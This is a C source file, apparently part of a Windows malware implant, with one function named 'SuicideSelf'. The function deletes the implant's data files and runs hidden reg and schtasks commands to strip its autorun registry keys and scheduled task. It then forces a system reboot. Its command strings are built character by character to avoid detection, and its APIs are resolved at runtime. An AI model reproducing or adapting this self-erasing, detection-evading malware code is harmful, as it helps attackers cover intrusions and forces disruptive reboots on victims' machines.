

#include <windows.h>
#include "../PublicVar.h"
#include "HardDiskFile.h"

int __stdcall SuicideSelf(){

	int iRet = 0;
	iRet = DeleteAllFilesInDir(strDataPath);					
	char szDeleteKeyFormat[] = {'r','e','g',' ','d','e','l','e','t','e',' ',
		'%','s','\\','S','o','f','t','w','a','r','e',0x5c,'M','i','c','r','o','s','o','f','t',0x5c,'W','i','n','d','o','w','s',0x5c,
		'C','u','r','r','e','n','t','V','e','r','s','i','o','n',0x5c,'R','u','n',' ',
		'/','v',' ','S','y','s','t','e','m','S','e','r','v','i','c','e','A','u','t','o','R','u','n',' ','/','f',' ',0};
// 		char szDeleteKeyCU[] = "reg delete HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\\ /v systemserviceautorun";
// 		char szDeleteKeyLM[] = "reg delete HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS\\CURRENTVERSION\\RUN\\ /v systemserviceautorun";
	if (iSystemVersion >= SYSTEM_VERSION_VISTA)
	{
		char szDeleteTaskFormat[] = {'s','c','h','t','a','s','k','s',' ','/','d','e','l','e','t','e',' ','/','f',' ','/','t','n',' ','%','s',0};
		char szDeleteTask[MAX_PATH];
		lpwsprintfA(szDeleteTask,szDeleteTaskFormat,LITTLEBEARNAME);
		iRet = lpWinExec(szDeleteTask,SW_HIDE);

		char szCuRun[MAX_PATH];
		char szCU[] = {'h','k','c','u',0};
		iRet = lpwsprintfA(szCuRun,szDeleteKeyFormat,szCU);
		iRet = lpWinExec(szCuRun,SW_HIDE);

		char szLmRun[MAX_PATH];
		char szLM[] = {'h','k','l','m',0};
		lpwsprintfA(szLmRun,szDeleteKeyFormat,szLM);
		iRet = lpWinExec(szLmRun,SW_HIDE);
	}
	else
	{
		char szCuRun[MAX_PATH];
		char szCU[] = {'h','k','c','u',0};
		lpwsprintfA(szCuRun,szDeleteKeyFormat,szCU);
		iRet = lpWinExec(szCuRun,SW_HIDE);

		char szLmRun[MAX_PATH];
		char szLM[] = {'h','k','l','m',0};
		lpwsprintfA(szLmRun,szDeleteKeyFormat,szLM);
		iRet = lpWinExec(szLmRun,SW_HIDE);
	}

	typedef DWORD  (__stdcall *ptrExitWindowsEx)(DWORD,DWORD);
	char szExitWindowsEx[] = {'E','x','i','t','W','i','n','d','o','w','s','E','x',0};
	ptrExitWindowsEx lpExitWindowsEx = (ptrExitWindowsEx)lpGetProcAddress(lpDllUser32,szExitWindowsEx);
	iRet = lpExitWindowsEx(EWX_REBOOT,EWX_FORCE);
	iRet = lpExitProcess(0);

	return TRUE;
}